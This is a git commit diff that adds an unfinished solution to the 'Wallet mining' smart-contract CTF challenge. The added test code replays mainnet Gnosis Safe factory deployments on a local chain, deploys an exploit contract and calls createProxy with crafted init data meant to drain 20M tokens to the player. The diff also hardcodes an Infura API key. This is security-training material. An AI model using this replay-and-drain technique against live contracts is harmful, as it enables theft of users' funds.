b01b79da9d15931606bb077e02fea7a53f3e1d4c
Ahmed Ihsan Tawfeeq <ahmed.i.tawfeeq@protonmail.com>
2023-12-11 22:52:02 -0700

    feat: make progress on wallet-mining

--- test/wallet-mining/wallet-mining.challenge.js
+++ test/wallet-mining/wallet-mining.challenge.js
@@ -6,8 +6,10 @@ describe('[Challenge] Wallet mining', function () {
     let token, authorizer, walletDeployer;
     let initialWalletDeployerTokenBalance;
     
-    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
-    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;
+    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801'; // has 20M DVT tokens and no code and assinged to a ward
+    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n; // 20M DVT tokens
+    
+    // we need to drain both walletDeployer and DEPOSIT_ADDRESS
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -42,7 +44,7 @@ describe('[Challenge] Wallet mining', function () {
         await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;
 
         // Fund Safe Deployer with tokens
-        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
+        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43); // 43 DVT tokens, 1 DVT token per wallet deployed
         await token.transfer(
             walletDeployer.address,
             initialWalletDeployerTokenBalance
@@ -66,6 +68,70 @@ describe('[Challenge] Wallet mining', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const provider = new ethers.providers.InfuraProvider("mainnet", "8d7e1ccb994f44b2ac14432b6a308f9c"); // TODO: use env for infura key
+        // the address that deployed the fact contract
+        const factDeployer = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
+        // the tx hashes of the fact contract deployments
+        const factTxHashes = [
+            "0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3",
+            "0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4",
+            "0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261"
+        ];
+
+        // send funds to the fact deployer
+        await player.sendTransaction({
+            to: factDeployer,
+            value: ethers.utils.parseEther("100")
+        });
+
+        // replay the transactions for deploying the fact contract and the copy contract
+        for (const txHash of factTxHashes) {
+            // get the transaction from the mainnet provider
+            let tx = await provider.getTransaction(txHash);
+            // the unsigned transaction
+            const unsignedTx = {
+                to: tx.to,
+                nonce: tx.nonce,
+                gasLimit: tx.gasLimit,
+                gasPrice: tx.gasPrice,
+                data: tx.data,
+                value: tx.value,
+                chainId: tx.chainId
+            };
+            // the signature of the transaction
+            const signature = {
+                v: tx.v,
+                r: tx.r,
+                s: tx.s
+            }
+
+            // serialize the transaction
+            const serializedTx = ethers.utils.serializeTransaction(unsignedTx, signature);
+            // replay the serialized transaction on the hardhat network
+            await ethers.provider.send("eth_sendRawTransaction", [serializedTx]);
+        }
+
+        // the factory contract now has code
+        const factContract = await ethers.getContractAt("GnosisSafeProxyFactory", await walletDeployer.fact());
+        const copyAddress = await walletDeployer.copy();
+        // deploy the safe of the deposit address
+
+        const exploit = await (await ethers.getContractFactory('WalletMiningExploit', player)).deploy(token.address, walletDeployer.address);
+
+        await exploit.connect(player).exploit();
+
+        // deploy all safes prior to the deposit safe
+        for (let i = 0; i < 42; i++) {
+            // no initialization data is needed
+            await factContract.createProxy(copyAddress, "0x");
+        }
+
+        // the initalization data should drain the deposit address and send the funds to the player
+        const data = "0xb63e800d0000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000140000000000000000000000000d5d82b6addc9027b22dca772aa68d5d74cdbdf440000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000051d07a4fb3bd10121a343d85818da60000000000000000000000000000000000000000000000000000000000000000";
+        // deploy the safe of the deposit address and drain the funds to the player
+        await factContract.createProxy(copyAddress, data);
+
+        // replay the transaction for 
     });
 
     after(async function () {
